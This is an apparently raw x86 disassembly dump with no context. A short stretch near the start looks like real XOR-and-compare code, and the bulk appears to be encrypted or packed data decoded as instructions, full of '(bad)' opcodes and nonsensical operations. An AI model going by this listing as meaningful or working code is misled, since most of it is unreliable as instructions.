  41c885:	rcr    DWORD PTR [ebp+0x7d],0xff
  41c889:	je     0x41c8af
  41c88b:	je     0x41c88c
  41c88d:	je     0x41c8b3
  41c88f:	je     0x41c890
  41c891:	je     0x41c8b7
  41c893:	and    al,0xff
  41c895:	je     0x41c8bb
  41c897:	and    al,0xe8
  41c899:	imul   edx,DWORD PTR [ecx+0x548bffff],0x448b1824
  41c8a3:	and    al,0x1c
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	enter  0x3fc1,0xbe
  41c93f:	out    dx,eax
  41c940:	imul   edx,DWORD PTR [esi],0x18
  41c943:	mov    esp,0x181812
  41c948:	shl    DWORD PTR [esi+esi*8+0x17ed5259],0x71
  41c950:	jbe    0x41c9b4
  41c952:	out    dx,eax
  41c953:	mov    ch,0xe6
  41c955:	(bad)  
  41c956:	rcr    BYTE PTR [ebx],cl
  41c958:	aas    
  41c959:	jo     0x41c93e
  41c95b:	and    eax,0xf4207fb4
  41c960:	add    al,0x83
  41c962:	or     edi,DWORD PTR [ecx+ebp*4-0x4d]
  41c966:	inc    esp
  41c967:	jle    0x41c8fd
  41c969:	cs xchg ecx,eax
  41c96b:	jl     0x41c919
  41c96d:	dec    edi
  41c96e:	jmp    0xe6b6f1e1
  41c973:	fs inc esp
  41c975:	iret   
  41c976:	fsub   DWORD PTR [edi+ecx*4+0x47]
  41c97a:	and    ecx,ecx
  41c97c:	jo     0x41c9bd
  41c97e:	xchg   edx,eax
  41c97f:	dec    esi
  41c980:	lods   eax,DWORD PTR ds:[esi]
  41c981:	shl    al,0xef
  41c984:	or     BYTE PTR [edx],ch
  41c986:	popf   
  41c987:	adc    al,BYTE PTR [edi+0x61]
  41c98a:	adc    BYTE PTR [edi-0x67],cl
  41c98d:	imul   edi,ebp,0xffffffd1
  41c990:	and    BYTE PTR [ecx],al
  41c992:	push   ebp
  41c993:	popf   
  41c994:	out    dx,eax
  41c995:	mov    ecx,0x4e3dfea3
  41c99a:	push   cs
  41c99b:	mul    BYTE PTR [ecx+0x5f]
  41c99e:	out    0x33,al
  41c9a0:	fild   QWORD PTR [edx+0x34]
  41c9a3:	fwait
  41c9a4:	sub    bh,al
  41c9a6:	leave  
  41c9a7:	aas    
  41c9a8:	jp     0x41c963
  41c9aa:	and    BYTE PTR [ecx-0x22],bl
  41c9ad:	(bad)  
  41c9ae:	iret   
  41c9af:	dec    ecx
  41c9b0:	mov    dl,0xf2
  41c9b2:	repnz add eax,0xad03ca18
  41c9b8:	neg    BYTE PTR [ebx]
  41c9ba:	sub    al,0x26
  41c9bc:	mov    cl,0x61
  41c9be:	mov    ds:0x83f67e61,eax
  41c9c3:	sbb    ah,BYTE PTR [ecx+ebp*4]
  41c9c6:	pop    ds
  41c9c7:	mov    ds:0x6fea36db,al
  41c9cc:	popf   
  41c9cd:	mov    ds:0x29a9c805,al
  41c9d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9d3:	cmp    ebp,DWORD PTR [ebp-0x19b01285]
  41c9d9:	stos   DWORD PTR es:[edi],eax
  41c9da:	and    esp,DWORD PTR [eax]
  41c9dc:	arpl   WORD PTR [ecx+ebp*4],ax
  41c9df:	jae    0x41c96c
  41c9e1:	cwde   
  41c9e2:	fst    DWORD PTR [edi-0x4b]
  41c9e5:	lock cmp eax,0xcbc78217
  41c9eb:	mov    ecx,0x14a930ec
  41c9f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9f1:	es jecxz 0x41c9e3
  41c9f4:	int    0x57
  41c9f6:	inc    eax
  41c9f7:	mov    bl,0xed
  41c9f9:	outs   dx,BYTE PTR ds:[esi]
  41c9fa:	jecxz  0x41c9ca
  41c9fc:	rol    ebp,0xb2
  41c9ff:	sti    
  41ca00:	cld    
  41ca01:	add    ecx,DWORD PTR [ebx-0x61a59cdc]
  41ca07:	loope  0x41c98e
  41ca09:	fisub  DWORD PTR [eax+0x2c7c6060]
  41ca0f:	push   esp
  41ca10:	scas   eax,DWORD PTR es:[edi]
  41ca11:	mov    ebx,0xcedad51c
  41ca16:	mov    bl,0x59
  41ca18:	in     eax,0xa7
  41ca1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca1b:	fcom   QWORD PTR [esi-0x32]
  41ca1e:	push   ebp
  41ca1f:	xor    ecx,DWORD PTR [edx+0x67]
  41ca22:	xor    ecx,DWORD PTR [ebp-0xb]
  41ca25:	push   ebp
  41ca26:	test   eax,0x78de8953
  41ca2b:	jnp    0x41c9fb
  41ca2d:	xchg   DWORD PTR [edx-0x519a25ff],ebp
  41ca33:	xor    BYTE PTR [edi-0x2570ccd9],ah
  41ca39:	adc    ah,BYTE PTR [ecx-0x43]
  41ca3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca3d:	or     ch,BYTE PTR ds:0x62791179
  41ca43:	jo     0x41c9e0
  41ca45:	or     BYTE PTR [esi],ah
  41ca47:	jmp    0x41ca25
  41ca49:	sti    
  41ca4a:	sub    al,0x4c
  41ca4c:	push   esi
  41ca4d:	int    0xde
  41ca4f:	mov    ecx,0xeb873531
  41ca54:	repnz cmp BYTE PTR [ebx],0x13
  41ca58:	js     0x41ca57
  41ca5a:	cmp    bl,cl
  41ca5c:	adc    ecx,DWORD PTR [ecx]
  41ca5e:	cwde   
  41ca5f:	mov    dh,0x83
  41ca61:	and    eax,0x27143272
  41ca66:	mov    edi,0xede8c5a6
  41ca6b:	push   edx
  41ca6c:	jne    0x41ca46
  41ca6e:	imul   ebx,DWORD PTR ds:[edx+0x1c9db18a],0xe0001154
  41ca79:	mov    ds:0xc65cbf78,eax
  41ca7e:	scas   eax,DWORD PTR es:[edi]
  41ca7f:	sub    DWORD PTR [edx+0x3a7e05e],eax
  41ca85:	inc    ebx
  41ca86:	addr16 and bh,dh
  41ca89:	push   ss
  41ca8a:	sahf   
  41ca8b:	inc    esi
  41ca8c:	ss mov dh,0x7f
  41ca8f:	fistp  QWORD PTR [ebx-0x51]
  41ca92:	push   ds
  41ca93:	push   cs
  41ca94:	dec    esi
  41ca95:	clc    
  41ca96:	mov    ebx,0xdd4c9e51
  41ca9b:	and    BYTE PTR [edx+0x76],0xdb
  41ca9f:	dec    BYTE PTR [ecx]
  41caa1:	xor    ebx,DWORD PTR [ebp+0x4871bf80]
  41caa7:	sub    al,0x8f
  41caa9:	cmp    eax,0xc8deaa78
  41caae:	sub    DWORD PTR [eax],ecx
  41cab0:	fdivr  st(0),st
  41cab2:	jle    0x41ca72
  41cab4:	iret   
  41cab5:	mov    edi,0x84650b
  41caba:	dec    ebp
  41cabb:	(bad)  
  41cabc:	jno    0x41ca96
  41cabe:	in     eax,0xb0
  41cac0:	cwde   
  41cac1:	mov    DWORD PTR [eax+0x177cd2aa],ebx
  41cac7:	xchg   ebx,eax
  41cac8:	xchg   esi,eax
  41cac9:	lea    ebp,[edx]
  41cacb:	ror    DWORD PTR [edi-0x7a],0x3f
  41cacf:	push   ebx
  41cad0:	inc    ebx
  41cad1:	jne    0x41cb2d
  41cad3:	stos   BYTE PTR es:[edi],al
  41cad4:	shl    cl,cl
  41cad6:	push   es
  41cad7:	aaa    
  41cad8:	sbb    bh,dh
  41cada:	(bad)
  41cadd:	xchg   ebp,eax
  41cade:	add    DWORD PTR [ebx],edi
  41cae0:	data16 (bad) 
  41cae2:	xchg   edi,eax
  41cae3:	jecxz  0x41cadf
  41cae5:	shr    BYTE PTR [esi+0x73],1
  41cae8:	out    dx,eax
  41cae9:	fadd   st,st(7)
  41caeb:	mov    ds:0x21b84b8c,eax
  41caf0:	sbb    eax,0x9336f73b
  41caf5:	mov    esp,0x8bbe94d5
  41cafa:	retf   
  41cafb:	sbb    bh,BYTE PTR [esi+0x70]
  41cafe:	test   DWORD PTR [edx-0x77],ecx
  41cb01:	sti    
  41cb02:	imul   edx,DWORD PTR [ebx-0x10dfc6f6],0x61c0ff9d
  41cb0c:	mov    WORD PTR [eax-0x56],cs
  41cb0f:	(bad)
  41cb12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb13:	jae    0x41ca96
  41cb15:	outs   dx,BYTE PTR ds:[esi]
  41cb16:	cld    
  41cb17:	xor    al,0xe2
  41cb19:	sub    DWORD PTR [eax],ebx
  41cb1b:	add    eax,0x58aef42
  41cb20:	xor    al,0x57
  41cb22:	outs   dx,BYTE PTR ds:[esi]
  41cb23:	push   es
  41cb24:	xor    al,0x9a
  41cb26:	aad    0x60
  41cb28:	push   ebp
  41cb29:	gs retf 
  41cb2b:	or     ebp,eax
  41cb2d:	pop    esp
  41cb2e:	add    DWORD PTR [eax+0x6d],edi
  41cb31:	sahf   
  41cb32:	test   BYTE PTR [ecx],ch
  41cb34:	pop    edx
  41cb35:	mov    eax,DWORD PTR [eax]
  41cb37:	test   BYTE PTR cs:[edi+0x34ffbf47],bl
  41cb3e:	daa    
  41cb3f:	(bad)
  41cb42:	mov    dl,0xf8
  41cb44:	out    0xcb,eax
  41cb46:	mov    eax,ds:0xdc3166e7
  41cb4b:	mov    bh,0xf9
  41cb4d:	stos   DWORD PTR es:[edi],eax
  41cb4e:	nop
  41cb4f:	nop
  41cb50:	test   BYTE PTR [ebx+0x4a],dl
  41cb53:	cld    
  41cb54:	loop   0x41cb69
  41cb56:	mov    ecx,0x59408768
  41cb5b:	add    BYTE PTR [edx-0x5],bl
  41cb5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb5f:	loopne 0x41cb11
  41cb61:	sar    DWORD PTR [eax-0x21204eb1],1
  41cb67:	push   edi
  41cb68:	xchg   edx,eax
  41cb69:	repz xor al,0x2
  41cb6c:	mov    dl,0xc5
  41cb6e:	das    
  41cb6f:	in     eax,0xa1
  41cb71:	fwait
  41cb72:	inc    edx
  41cb73:	in     al,dx
  41cb74:	outs   dx,DWORD PTR ds:[esi]
  41cb75:	lock jbe 0x41cb08
  41cb78:	js     0x41cb10
  41cb7a:	clc    
  41cb7b:	jge    0x41cbf1
  41cb7d:	adc    dh,ah
  41cb7f:	imul   eax,DWORD PTR [ebx-0x3f],0x18312f2d
  41cb86:	or     al,0x8
  41cb88:	pop    edi
  41cb89:	push   cs
  41cb8a:	shr    DWORD PTR [ebx-0x6e],0xbe
  41cb8e:	jg     0x41cba2
  41cb90:	jmp    0x41cb40
  41cb92:	jge    0x41cb28
  41cb94:	jbe    0x41cbdc
  41cb96:	sti    
  41cb97:	sbb    esp,0xffffffcc
  41cb9a:	cmp    al,0x89
  41cb9c:	call   0x5b38:0x92052232
  41cba3:	push   edi
  41cba4:	adc    BYTE PTR [eax-0x57],ah
  41cba7:	sahf   
  41cba8:	and    al,0x59
  41cbaa:	lock (bad) 
  41cbac:	pop    ecx
  41cbad:	xchg   ebx,eax
  41cbae:	ret    
  41cbaf:	test   DWORD PTR [ecx],edi
  41cbb1:	repz (bad) 
  41cbb3:	in     al,dx
  41cbb4:	or     cl,BYTE PTR [edi-0x37fc54f0]
  41cbba:	call   0x62a:0xef6628ff
  41cbc1:	mov    al,ds:0xd1a632f1
  41cbc6:	aaa    
  41cbc7:	faddp  st(1),st
  41cbc9:	add    BYTE PTR [ebp-0x37],0xe2
  41cbcd:	pop    ecx
  41cbce:	frstor [edi]
  41cbd0:	loope  0x41cc16
  41cbd2:	fnstcw WORD PTR [esi+0x567a1dfe]
  41cbd8:	pop    esp
  41cbd9:	call   0x8527:0x771728a9
  41cbe0:	sbb    DWORD PTR [edi+0x3e],ecx
  41cbe3:	push   esp
  41cbe4:	jbe    0x41cbf3
  41cbe6:	call   ebp
  41cbe8:	ret    0xac70
  41cbeb:	dec    dx
  41cbed:	pop    edx
  41cbee:	out    0x4d,eax
  41cbf0:	rcl    BYTE PTR [edx],0x7c
  41cbf3:	adc    DWORD PTR [ecx],esp
  41cbf5:	test   eax,0xcecdae85
  41cbfa:	enter  0x3cad,0x26
  41cbfe:	push   ecx
  41cbff:	mov    ebp,DWORD PTR [ebx-0x1c677927]
  41cc05:	ror    DWORD PTR [ebp-0x64],0x7
  41cc09:	xchg   ebp,eax
  41cc0a:	imul   ebp,ecx,0xd166078a
  41cc10:	fisub  WORD PTR [esi+0x5a246b24]
  41cc16:	inc    ebp
  41cc17:	lock sbb BYTE PTR [edx-0x20d0b55d],ah
  41cc1e:	cmc    
  41cc1f:	sub    cl,dl
  41cc21:	push   ebx
  41cc22:	dec    ebx
  41cc23:	push   0x7dec5697
  41cc28:	xchg   edx,eax
  41cc29:	and    cl,BYTE PTR [edi+0x1ca691e5]
  41cc2f:	pop    esp
  41cc30:	enter  0xa665,0x42
  41cc34:	mov    esp,edi
  41cc36:	xor    BYTE PTR [eax+0x78],dl
  41cc39:	in     al,0x9f
  41cc3b:	push   ss
  41cc3c:	pop    edx
  41cc3d:	xor    DWORD PTR [edx+0x2b9ef596],esp
  41cc43:	jle    0x41cbdd
  41cc45:	xor    esp,DWORD PTR [ebx]
  41cc47:	repnz data16 loopne 0x41cc3b
  41cc4b:	loopne 0x41ccaa
  41cc4d:	mov    eax,ds:0x64e52dc
  41cc52:	scas   eax,DWORD PTR es:[edi]
  41cc53:	mov    dh,0x11
  41cc55:	xor    esp,ebp
  41cc57:	(bad)  
  41cc59:	sub    DWORD PTR [eax+0x4958d4ed],edx
  41cc5f:	sbb    al,cl
  41cc61:	out    dx,eax
  41cc62:	dec    ebp
  41cc63:	cs and eax,0xae0de61b
  41cc69:	lds    ebx,FWORD PTR [esi]
  41cc6b:	jbe    0x41cc7d
  41cc6d:	xlat   BYTE PTR ds:[ebx]
  41cc6e:	cmp    ebx,DWORD PTR [esi-0x18]
  41cc71:	(bad)  
  41cc73:	sbb    bh,ch
  41cc75:	pop    es
  41cc76:	add    BYTE PTR [ebx],dh
  41cc78:	stc    
  41cc79:	mov    bl,0x19
  41cc7b:	jae    0x41ccbf
  41cc7d:	sub    esp,DWORD PTR [ecx-0x7]
  41cc80:	std    
  41cc81:	(bad)  
  41cc83:	sub    esi,esp
  41cc85:	cmp    esp,edx
  41cc87:	retf   0x8ab8
  41cc8a:	add    al,0xcd
  41cc8c:	xchg   esi,eax
  41cc8d:	std    
  41cc8e:	and    edx,DWORD PTR [edx]
  41cc90:	sub    ah,cl
  41cc92:	int3   
  41cc93:	sbb    eax,0x6d7e7ab4
  41cc98:	jmp    0xf625bd95
  41cc9d:	inc    eax
  41cc9e:	adc    DWORD PTR [esi],esp
  41cca0:	sbb    DWORD PTR [edx-0x52a14802],ebp
  41cca6:	mov    esi,0x49a7aa2d
  41ccab:	xchg   BYTE PTR [ebx],al
  41ccad:	pop    es
  41ccae:	repz pop es
  41ccb0:	adc    esp,DWORD PTR [ecx]
  41ccb2:	pushf  
  41ccb3:	fsub   DWORD PTR [esi-0x12]
  41ccb6:	enter  0x2621,0x8
  41ccba:	inc    ecx
  41ccbb:	dec    esi
  41ccbc:	arpl   dx,dx
  41ccbe:	mov    al,0xba
  41ccc0:	xchg   ebp,eax
  41ccc1:	inc    edx
  41ccc2:	pop    edi
  41ccc3:	(bad)  
  41ccc4:	lds    ebx,FWORD PTR [ecx]
  41ccc6:	cmp    DWORD PTR [esi],eax
  41ccc8:	ficomp DWORD PTR [ebp+0x2e]
  41cccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cccc:	mov    dh,0xd9
  41ccce:	pop    edx
  41cccf:	stc    
  41ccd0:	jecxz  0x41cc64
  41ccd2:	test   eax,0x868568da
  41ccd7:	mov    eax,ds:0x5b9d4ac8
  41ccdc:	scas   al,BYTE PTR es:[edi]
  41ccdd:	aad    0x8d
  41ccdf:	nop
  41cce0:	sub    BYTE PTR [esi],ch
  41cce2:	sub    al,0x6b
  41cce4:	ficomp DWORD PTR [ebp+0x440a67c7]
  41ccea:	push   ebx
  41cceb:	xlat   BYTE PTR ds:[ebx]
  41ccec:	js     0x41cd4e
  41ccee:	aad    0xe
  41ccf0:	loope  0x41ccb7
  41ccf2:	or     esi,0x4bb755e5
  41ccf8:	mov    DWORD PTR [edx+0xc3c244c],ecx
  41ccfe:	fsub   st(1),st
  41cd00:	retf   0x3
  41cd03:	add    dh,bl
  41cd05:	dec    esi
  41cd06:	push   ss
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0x6a49ecd2
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1-0x6f28e7e8],bh
  41cd1e:	int3   
  41cd1f:	es (bad) 
  41cd21:	adc    bh,BYTE PTR [eax-0x1a]
  41cd24:	bswap  esp
  41cd26:	add    esp,DWORD PTR [ebp+0x3d6f2cb7]
  41cd2c:	mov    ch,cl
  41cd2e:	pop    ecx
  41cd2f:	mov    ebx,0xb6a9a947
  41cd34:	gs jbe 0x41cd05
  41cd37:	pop    edx
  41cd38:	or     dl,BYTE PTR [ecx+0x7f7aab6a]
  41cd3e:	lods   al,BYTE PTR ds:[esi]
  41cd3f:	ret    
  41cd40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd41:	xchg   al,cl
  41cd43:	loope  0x41cd43
  41cd45:	test   esp,ecx
  41cd47:	mov    ds:0x2dda3ae5,eax
  41cd4c:	shr    BYTE PTR [ebx-0x46da1dec],1
  41cd52:	push   cs
  41cd53:	stc    
  41cd54:	xchg   edx,eax
  41cd55:	iret   
  41cd56:	xchg   esp,eax
  41cd57:	mov    ebx,0xc19b09c9
  41cd5c:	mov    al,0xc4
  41cd5e:	retf   0xc30c
  41cd61:	out    0xbf,eax
  41cd63:	xor    DWORD PTR [ebx],ecx
  41cd65:	out    dx,al
  41cd66:	inc    ebx
  41cd67:	jmp    0xc692:0x7997e379
  41cd6e:	sti    
  41cd6f:	mov    bh,0x8c
  41cd71:	call   0x23d74ca3
  41cd76:	pushf  
  41cd77:	dec    eax
  41cd78:	test   al,0x9b
  41cd7a:	or     bl,BYTE PTR [edi-0x4c0bad5e]
  41cd80:	out    dx,eax
  41cd81:	lds    edi,FWORD PTR [esi-0x5d]
  41cd84:	pop    esp
  41cd85:	mov    esi,0xe63dfa98
  41cd8a:	(bad)  
  41cd8b:	push   eax
  41cd8c:	adc    BYTE PTR [ecx-0x634f970c],0xa1
  41cd93:	imul   ebp,DWORD PTR [eax],0xffffffbf
  41cd96:	aas    
  41cd97:	add    al,0x92
  41cd99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd9a:	adc    eax,0xcdff42d7
  41cd9f:	std    
  41cda0:	mov    esp,0x6406e696
  41cda5:	pop    ds
  41cda6:	mov    al,0xff
  41cda8:	imul   eax,DWORD PTR [eax+0x65],0x10
  41cdac:	cmp    esi,0xebd86df8
  41cdb2:	sub    BYTE PTR ds:0x85da9e00,ch
  41cdb8:	add    bh,bl
  41cdba:	dec    edi
  41cdbb:	sti    
  41cdbc:	loop   0x41cd6e
  41cdbe:	aaa    
  41cdbf:	jnp    0x41cd9e
  41cdc1:	push   ecx
  41cdc2:	aaa    
  41cdc3:	test   al,0x34
  41cdc5:	or     al,BYTE PTR [eax-0x43]
  41cdc8:	dec    esp
  41cdc9:	aam    0x7b
  41cdcb:	ror    BYTE PTR [edx+edi*1+0x32d0235],1
  41cdd2:	add    al,0x5a
  41cdd4:	jae    0x41cd65
  41cdd6:	sub    eax,0xa8a34695
  41cddb:	add    al,0x80
  41cddd:	loop   0x41ce05
  41cddf:	mov    WORD PTR [edi-0x615ad746],?
  41cde5:	and    eax,0xb074bf92
  41cdea:	in     eax,dx
  41cdeb:	out    0xed,eax
  41cded:	xor    al,0x8e
  41cdef:	pop    es
  41cdf0:	pop    ss
  41cdf1:	xchg   ebx,eax
  41cdf2:	ss xor bl,dl
  41cdf5:	cmp    eax,0xfb0a3059
  41cdfa:	mov    ecx,0x3f1e4b06
  41cdff:	pop    edx
  41ce00:	add    al,0xe
  41ce02:	push   cs
  41ce03:	mov    ebx,0xeb88cd2d
  41ce08:	hlt    
  41ce09:	es jb  0x41cdea
  41ce0c:	or     edx,DWORD PTR [esi]
  41ce0e:	fs scas al,BYTE PTR es:[edi]
  41ce10:	arpl   WORD PTR [eax-0x15],dx
  41ce13:	and    cl,dh
  41ce15:	rcl    DWORD PTR ds:0x6dcc9a47,1
  41ce1b:	cdq    
  41ce1c:	xchg   BYTE PTR [ebx+edx*8-0x2b3a2c01],bl
  41ce23:	cmp    edi,DWORD PTR [ebx+ebx*2+0x49ecc935]
  41ce2a:	stc    
  41ce2b:	pop    ebx
  41ce2c:	loope  0x41cdd7
  41ce2e:	out    dx,al
  41ce2f:	inc    esi
  41ce30:	popf   
  41ce31:	std    
  41ce32:	and    ah,BYTE PTR [edi+0x2c445add]
  41ce38:	popa   
  41ce39:	arpl   WORD PTR [ebx+0x2a],cx
  41ce3c:	(bad)  
  41ce3d:	fcomp  DWORD PTR [edi-0x4e228d1a]
  41ce43:	cmp    DWORD PTR [eax],esi
  41ce45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce46:	sar    DWORD PTR [ebp+0x1e],0x8f
  41ce4a:	in     eax,0x85
  41ce4c:	adc    DWORD PTR [eax+0x77],0xfffffff9
  41ce50:	mov    edx,0x826fd1eb
  41ce55:	xor    eax,0xd7ab52f3
  41ce5a:	pop    edi
  41ce5b:	sbb    BYTE PTR [eax-0x47],dh
  41ce5e:	and    ecx,DWORD PTR [edi]
  41ce60:	pop    edx
  41ce61:	(bad)
  41ce64:	sbb    al,0xaf
  41ce66:	stos   DWORD PTR es:[edi],eax
  41ce67:	pop    ecx
  41ce68:	mul    BYTE PTR [esi]
  41ce6a:	scas   eax,DWORD PTR es:[edi]
  41ce6b:	push   0x3c
  41ce6d:	xchg   esi,eax
  41ce6f:	inc    esp
  41ce70:	push   0x1c
  41ce72:	jge    0x41cea2
  41ce74:	dec    esi
  41ce75:	out    0xf7,eax
  41ce77:	pop    ebx
  41ce78:	mov    ch,al
  41ce7a:	ret    
  41ce7b:	jo     0x41ce07
  41ce7d:	rcr    BYTE PTR [ecx-0x58],cl
  41ce80:	scas   al,BYTE PTR es:[edi]
  41ce81:	ret    0xb097
  41ce84:	enter  0x567c,0xf0
  41ce88:	jne    0x41ceff
  41ce8a:	pop    eax
  41ce8b:	icebp  
  41ce8c:	xor    BYTE PTR [esi-0x3a],bl
  41ce8f:	pop    esi
  41ce90:	mov    al,ds:0x99e50545
  41ce95:	add    al,0xaa
  41ce97:	xor    ebp,ecx
  41ce99:	push   es
  41ce9a:	shr    DWORD PTR [ecx-0x38553c9d],cl
  41cea0:	test   BYTE PTR [ebx-0x13ce9da3],0xea
  41cea7:	(bad)  
  41cea8:	jle    0x41ce7f
  41ceaa:	adc    al,0x54
  41ceac:	stc    
  41cead:	and    ah,BYTE PTR [ecx+0x4fe5624a]
  41ceb3:	hlt    
  41ceb4:	dec    ebp
  41ceb5:	add    bh,BYTE PTR [ecx-0x6b]
  41ceb8:	inc    esi
  41ceb9:	mov    edi,DWORD PTR [edx]
  41cebb:	adc    edi,esp
  41cebd:	dec    esi
  41cebe:	imul   edi,DWORD PTR [ecx+0x2e1c76ec],0x33
  41cec5:	loopne 0x41ce9d
  41cec7:	enter  0x7e54,0xd5
  41cecb:	fadd   st,st(1)
  41cecd:	mov    esp,DWORD PTR [edx+0x25]
  41ced0:	jbe    0x41cf1c
  41ced2:	scas   al,BYTE PTR es:[edi]
  41ced3:	add    BYTE PTR [ebx-0x52b5d076],dl
  41ced9:	xchg   esi,eax
  41ceda:	or     al,0x60
  41cedc:	jo     0x41cea1
  41cede:	sbb    eax,0x8106c3af
  41cee3:	mov    dh,0x31
  41cee5:	jl     0x41cf38
  41cee7:	jbe    0x41cee4
  41cee9:	pop    ebx
  41ceea:	sub    eax,0x4dcf8ac3
  41ceef:	in     al,dx
  41cef0:	ret    
  41cef1:	fisub  DWORD PTR [ebp-0x705c53d9]
  41cef7:	jp     0x41ceb4
  41cef9:	(bad)  
  41cefa:	sbb    edi,DWORD PTR ss:[esi]
  41cefd:	mov    ch,0x86
  41ceff:	pop    ecx
  41cf00:	and    al,0x62
  41cf02:	and    ecx,esi
  41cf04:	or     al,BYTE PTR [eax]
  41cf06:	adc    dl,BYTE PTR [ecx+ebp*2+0x415ebabb]
  41cf0d:	push   esp
  41cf0e:	and    DWORD PTR [eax-0x2d],esp
  41cf11:	jae    0x41ced0
  41cf13:	loop   0x41cedb
  41cf15:	xor    eax,0x4408afc3
  41cf1a:	leave  
  41cf1b:	std    
  41cf1c:	xchg   edx,eax
  41cf1d:	not    ch
  41cf1f:	mov    ah,0x67
  41cf21:	mov    DWORD PTR [ecx],edi
  41cf23:	add    BYTE PTR ds:0x4ff0e8e2,ch
  41cf29:	sar    BYTE PTR [edi+0x1afde846],0xc8
  41cf30:	scas   al,BYTE PTR es:[edi]
  41cf31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf32:	shr    DWORD PTR [esi+edi*8],cl
  41cf35:	lods   eax,DWORD PTR ds:[esi]
  41cf36:	leave  
  41cf37:	inc    ecx
  41cf38:	jmp    0x2c8e:0x52c061b2
  41cf3f:	cmp    ah,BYTE PTR [edi+0x63]
  41cf42:	dec    eax
  41cf43:	cmc    
  41cf44:	fidiv  WORD PTR [edi+0x42a3daf8]
  41cf4a:	pop    ebx
  41cf4b:	rdpmc  
  41cf4d:	xacquire xchg DWORD PTR [eax],edx
  41cf50:	ins    DWORD PTR es:[edi],dx
  41cf51:	inc    ecx
  41cf52:	rol    WORD PTR [ecx+0x2a05619e],0xdd
  41cf5a:	push   cs
  41cf5b:	sbb    cl,0x2a
  41cf5e:	fadd   st(5),st
  41cf60:	xor    BYTE PTR [ebp+0x4deb8e0f],bh
  41cf66:	mov    al,ds:0xda706e41
  41cf6b:	aaa    
  41cf6c:	push   ebp
  41cf6d:	and    DWORD PTR [ebx+0xa],esi
  41cf70:	test   DWORD PTR [eax],0xf6a6f8a2
  41cf76:	test   al,0x8e
  41cf78:	inc    edx
  41cf79:	pusha  
  41cf7a:	les    edi,FWORD PTR [ebx-0x73]
  41cf7d:	push   ds
  41cf7e:	jae    0x41cfa1
  41cf80:	clc    
  41cf81:	mov    bh,0x18
  41cf83:	call   0xf41e:0xef00ff12
  41cf8a:	mov    ds:0x6ea96ae,eax
  41cf8f:	(bad)  
  41cf90:	ja     0x41cfc5
  41cf92:	pop    ss
  41cf93:	xor    edi,DWORD PTR [edi+0x77]
  41cf96:	lods   eax,DWORD PTR ds:[esi]
  41cf97:	inc    esp
  41cf98:	popf   
  41cf99:	mov    esp,0xe152f43b
  41cf9e:	cdq    
  41cf9f:	jmp    0x2943f67c
  41cfa4:	push   esp
  41cfa5:	nop
  41cfa6:	mov    bl,0x42
  41cfa8:	xlat   BYTE PTR ds:[ebx]
  41cfa9:	ins    DWORD PTR es:[edi],dx
  41cfaa:	(bad)  
  41cfab:	sbb    bh,dl
  41cfad:	push   0x873fa25e
  41cfb2:	div    esi
  41cfb4:	sub    ebx,DWORD PTR [eax]
  41cfb6:	(bad)  
  41cfb8:	lds    ebx,FWORD PTR [edx-0xa]
  41cfbb:	fisub  DWORD PTR [ecx+0x1221fef6]
  41cfc1:	adc    DWORD PTR [ebp+0x56b3e678],ebp
  41cfc7:	mov    edx,0xeb2bc15c
  41cfcc:	mov    esp,0x60e14bf7
  41cfd1:	cmp    DWORD PTR [ecx-0x5991b860],esi
  41cfd7:	mov    edi,DWORD PTR [eax+0x192b12fa]
  41cfdd:	sar    bh,0x6d
  41cfe0:	xor    edx,esi
  41cfe2:	and    al,0xd
